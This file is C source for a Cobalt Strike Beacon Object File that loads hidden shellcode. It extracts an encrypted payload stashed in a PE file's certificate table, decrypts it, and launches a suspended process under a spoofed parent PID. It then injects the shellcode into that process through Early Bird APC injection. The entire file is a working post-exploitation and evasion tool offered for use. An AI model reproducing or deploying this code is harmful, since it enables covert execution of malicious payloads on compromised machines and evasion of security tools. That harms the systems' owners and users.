#include "common.h"
#include "beacon.h"
#include "helpers.c"


#define KEY_LEN 8

#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS  0x00020000

typedef struct _STARTUPINFOEXW { 
    STARTUPINFOW StartupInfo;
    struct _PROC_THREAD_ATTRIBUTE_LIST *lpAttributeList;
} STARTUPINFOEXW, *LPSTARTUPINFOEXW;

void go(char* args, int length) {

	datap parser;
	char* _fPath = NULL;
	char* _key = NULL;
	int _ppid;
	DWORD _keySize = 0;
	char* _sProcess;
	
	BeaconDataParse(&parser, args, length);

	_fPath = BeaconDataExtract(&parser, NULL);
	_key = BeaconDataExtract(&parser, NULL);
	_sProcess = BeaconDataExtract(&parser, NULL);
	_ppid = BeaconDataInt(&parser);
	_keySize = MSVCRT$strlen(_key);


	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert ;
	unsigned checksum = 0;
	FILE* _outFile = NULL;
	SIZE_T _writtenBytes = 0;
	CHAR* _encryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD  _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	HANDLE _oHandle = INVALID_HANDLE_VALUE;
	DWORD _extraPaddingCount = 0;
	CHAR* _extraPadding = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	CHAR* _sha1Hash = NULL;
	LPWSTR _fwPath = NULL;
	LPWSTR _owPath = NULL;
	DWORD _dataOffset = 0;
	SIZE_T _index = 0;
	BYTE* _pePtr = NULL;
	DWORD _encryptedDataSize = 0;
	CHAR* _decryptedData = NULL;


	char* _fName = (char*)MSVCRT$malloc(MSVCRT$strlen(_fPath) + 1);
	_fName = getFName(_fPath, _fName);

	print("[*]: Loading/Parsing PE File '%s'", _fName);
	_fHandle = KERNEL32$CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}
	
	_fSize = KERNEL32$GetFileSize(_fHandle, NULL);
	_peBlob = MSVCRT$malloc(_fSize);
	KERNEL32$ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);

	if (_bytesRead == 0) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}

	PIMAGE_DOS_HEADER _dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		print("'%s' is not a valid PE file", _fName);
		goto _Exit;
	}

	
	PIMAGE_NT_HEADERS _ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER _optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
	
	if (IsWow64(KERNEL32$GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}else{
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);


	print("[+]: Scanning for data/shellcode...");
	_pePtr = ((BYTE*)_peBlob + _CertTableRVA);
	for (_index = 0; _index < _CertTableSize; _index++) {
		if (*(_pePtr + _index) == 0xfe && *(_pePtr + _index + 1) == 0xed && *(_pePtr + _index + 2) == 0xfa && *(_pePtr + _index + 3) == 0xce) {
			print("[*]:Shellcode Found at 0x%x", (_pePtr + _index));
			_dataOffset = _index + 8;
			break;
		}
	}

	if (_dataOffset != _index + 8) {
		print("[!]: Could not locate data/shellcode");
		goto _Exit;
	}
	
	//Decrypting shellcode
	print("[+]: Decrypting shellcode...");
	_encryptedDataSize = _CertTableSize - _dataOffset;
	_decryptedData = (CHAR*)MSVCRT$malloc(_encryptedDataSize);
	MSVCRT$memcpy(_decryptedData, _pePtr + _dataOffset, _encryptedDataSize);
	crypt((unsigned char*)_decryptedData, _encryptedDataSize, _key, _keySize, (unsigned char*)_decryptedData);
	print("[+]: Decrypted shellcode size: %d", _encryptedDataSize);



	//Shellcode Injection - Early Bird

	LPCWSTR sProcess ;
	LPCWSTR sPArgs ;
	STARTUPINFOEXW si = { sizeof(si) }; 
	SIZE_T attrListSize;
	PROCESS_INFORMATION pi ;
	LPVOID memAddr; 
	LPVOID oldProtect;   
	HANDLE hProcess, hThread;
	NTSTATUS status;

	int scLen;
	char* scPtr;

	sProcess = toMultiByte(MSVCRT$strlen(_sProcess), _sProcess, sProcess);
	sPArgs = L"-u -p 12432 -s 23543"; //in case you using werfault.exe as a host process.
	scLen = _encryptedDataSize;
	scPtr = _decryptedData;

	SIZE_T _scSize = sizeof(scPtr) * scLen;
	print("[+]: SpawnTo: %ls",sProcess);
	print("[+]: Shellcode Size: %d",scLen);

	print("[+]: Obtaining a handle of PID %d", _ppid);
	HANDLE pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, _ppid);

	print("[+]: Spawning sacrificial process...");

	KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attrListSize);
	KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize);
	KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

	if (!KERNEL32$CreateProcessW(sProcess, NULL, NULL, NULL, FALSE,
	CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi)){
	    print("[!]: CreateProcessW() Error: %d", KERNEL32$GetLastError());
			goto _Exit;
	}

	KERNEL32$WaitForSingleObject(pi.hProcess, 2000);
	hProcess = pi.hProcess;
	hThread = pi.hThread;

	memAddr = KERNEL32$VirtualAllocEx(hProcess, NULL, _scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	print("[+]: Writing shellcode into remote process...");
	KERNEL32$WriteProcessMemory(hProcess, memAddr, scPtr, _scSize, NULL);

	KERNEL32$VirtualProtectEx(hProcess, memAddr, _scSize, PAGE_EXECUTE_READ, oldProtect);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)memAddr;

	print("[+]: Queueing a User APC and Resuming the main thread");
	KERNEL32$QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);

	KERNEL32$ResumeThread(hThread);

	BeaconCleanupProcess(&pi);

		
	print("[*]: Done.");
	
	goto _Exit;

	_Exit:
		if (_peBlob) MSVCRT$free(_peBlob);
		if (_decryptedData) MSVCRT$free(_decryptedData);
		if (_fHandle) KERNEL32$CloseHandle(_fHandle);
		if (sProcess) MSVCRT$free(sProcess);

}


